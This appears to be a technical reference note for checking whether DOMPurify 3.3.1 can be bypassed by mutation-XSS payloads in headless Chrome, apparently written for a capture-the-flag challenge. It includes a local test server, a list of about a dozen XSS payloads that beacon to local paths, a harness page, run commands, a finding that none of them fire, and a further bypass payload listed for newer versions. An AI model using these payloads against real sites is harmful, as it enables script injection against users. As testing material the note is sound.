# DOMPurify 3.3.1 — Empirical mXSS Verification (Chrome 142/149)

When you need to test if a DOMPurify version is bypassable on a specific Chrome version, here's the working setup. Useful when prior session's empirical findings are stale or you suspect a new bypass.

## CDN URL situation (as of June 2026)

- `https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.3.1/purify.min.js` → **HTTP 404** (URL structure changed)
- `https://cdn.jsdelivr.net/npm/dompurify@3.3.1/dist/purify.min.js` → **HTTP 200**, CORS open
- `https://unpkg.com/dompurify@3.3.1/dist/purify.min.js` → **HTTP 200**

Always download DOMPurify locally and serve from your own server in tests. CDN-fetched versions may fail mid-test and give false negatives ("payload didn't fire" when actually the script never loaded).

## Local server template

```python
# server_v2.py — serves /path → /tmp/test/<path>
import os
from http.server import HTTPServer, BaseHTTPRequestHandler

TEST_DIR = '/tmp/dompurify_test'
LOG = f'{TEST_DIR}/access.log'

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        with open(LOG, 'a') as f:
            f.write(f"GET {self.path[:200]}\n")
        path = self.path.split('?')[0]
        local_path = (TEST_DIR + '/' + path.lstrip('/')) if path not in ('/', '') else (TEST_DIR + '/test.html')
        if path == '/purify.js':
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.end_headers()
            with open(f'{TEST_DIR}/purify.js', 'rb') as f:
                self.wfile.write(f.read())
        elif os.path.exists(local_path) and local_path.endswith('.html'):
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            with open(local_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'ok')
    def log_message(self, *a): pass

HTTPServer(('0.0.0.0', 9091), H).serve_forever()
```

**Bug to avoid:** naive `path.endswith('.html')` branch that hardcodes `test.html` will return the wrong file when you request `/simple.html`. Always build `local_path` from the requested path.

## Canonical payload set

Test these 12+ payloads against the default config (`DOMPurify.sanitize(p, {RETURN_TRUSTED_TYPE: false})`):

```js
const PAYLOADS = [
  {n: 'svg_onload', p: '<svg/onload=fetch("/M_SVG_ONLOAD")>'},
  {n: 'svg_style_img', p: '<svg><style><img src=x onerror=fetch("/M_SVG_STYLE")>'},
  {n: 'svg_anim', p: '<svg><animate attributeName=href values=javascript:fetch("/M_ANIMATE")>'},
  {n: 'foreignObject', p: '<svg><foreignObject><div><img src=x onerror=fetch("/M_FO")></div></foreignObject></svg>'},
  {n: 'math_mglyph', p: '<math><mtext><table><mglyph><style><img src=x onerror=fetch("/M_MATH")>'},
  {n: 'math_cdata', p: '<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=fetch("/M_CDATA")>]]></mglyph></table></mtext></math>'},
  {n: 'noscript', p: '<noscript><p title="</noscript><img src=x onerror=fetch("/M_NOSCRIPT")>">'},
  {n: 'xmp', p: '<xmp><p title="</xmp><img src=x onerror=fetch("/M_XMP")>">'},
  {n: 'noembed', p: '<noembed><p title="</noembed><img src=x onerror=fetch("/M_NOEMBED")>">'},
  {n: 'table_colgroup', p: '<table><colgroup><col><script>fetch("/M_TABLE")</script></colgroup></table>'},
  {n: 'details_open', p: '<details open ontoggle=fetch("/M_DETAILS")>'},
  {n: 'backtick', p: '<img src="x` `<script>fetch("/M_BACKTICK")</script>`">'},
  {n: 'form_math', p: '<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=fetch("/M_FORM")>'},
];
```

Each payload uses a unique fetch URL so the access log reveals exactly which (if any) executed.

## Test HTML template

```html
<!DOCTYPE html><html><body>
<script>
window.addEventListener('error', e => fetch('/ERR=' + encodeURIComponent(e.message + ' at ' + e.filename + ':' + e.lineno)));
fetch('/TEST_START');
</script>
<script src="/purify.js"></script>
<script>
fetch('/AFTER_LOAD');
try {
  if (typeof DOMPurify === 'undefined') { fetch('/NO_PURIFY'); throw 'no purify'; }
  fetch('/HAS_PURIFY');
  // ... sanitize each payload, innerHTML them ...
} catch(e) { fetch('/CATCH=' + encodeURIComponent(String(e))); }
</script>
</body></html>
```

## Run command

```bash
chromium --headless=new --disable-gpu --no-sandbox --disable-dev-shm-usage \
  --user-data-dir=/tmp/fresh_$$ \
  --virtual-time-budget=10000 \
  http://127.0.0.1:9091/test.html
```

The `--user-data-dir=/tmp/fresh_$$` is essential to bypass any caching from previous runs.

## Verified result on Chrome 142 (June 22, 2026)

DOMPurify 3.3.1 with default config CORRECTLY sanitizes ALL the listed payloads. No mXSS bypass fires. Specific outputs:

- `<svg/onload=fetch(...)>` → `<svg></svg>` (onload stripped)
- `<svg><style><img src=x onerror=...>` → `<svg><style></style></svg><img src="x">` (style content treated as rawtext, onerror stripped)
- `<svg><foreignObject>...` → no XSS
- `<math><mtext><table><mglyph><style><![CDATA[</style><img onerror=...>]]></mglyph></table></mtext></math>` → sanitized
- `<table><colgroup><col><script>` → script removed
- backtick-script test 102 → no fire
- CVE-2025-26791 math/mglyph variant → requires SAFE_FOR_TEMPLATES (not in queue.html's config)

**Conclusion:** DOMPurify 3.3.1 default config is NOT bypassable on Chrome 142 with known payloads as of June 2026. Same conclusion applies to Chrome 147/149 per prior session's empirical findings.

## If you need to test other DOMPurify versions

For 3.4.4+ the `<selectedcontent>` re-clone bypass (CVE-2026-47423 / GHSA-87xg-pxx2-7hvx) becomes available — make sure to test that specific payload:

```js
const selectedContent = '<selectedcontent><img src=x onerror=fetch("/M_SELECTEDCONTENT")></selectedcontent>';
```

For 3.3.3+ backtick-script fix added test 102 — the backtick payload above is exactly that test.

For 3.4.8+ "returns text content only when serializing" fix (issue #1457) — verify sanitizer output is always wrapped in TrustedHTML, never raw text.

## Cache invalidation gotcha

When testing multiple times, chromium caches by URL. To force fresh:

```bash
chromium --headless=new ... --user-data-dir=/tmp/fresh_$(date +%s) --virtual-time-budget=10000 <URL>
```

The `--user-data-dir` MUST be unique per run. Without this, you may see stale results from a cached previous run — particularly confusing because the access log shows the OLD payload executions even when your new test HTML has no payloads.

## Related references

- `references/modern-xs-leaks-patterns.md` — broader XS-Leak + XSS primitive catalog
- `references/deskmesh-flask-dual-port.md` — specific Chrome 147/149 empirical findings for the Deskmesh challenge
- `references/deskmesh-actual-exploitability-2026.md` — full empirical session log including what doesn't work
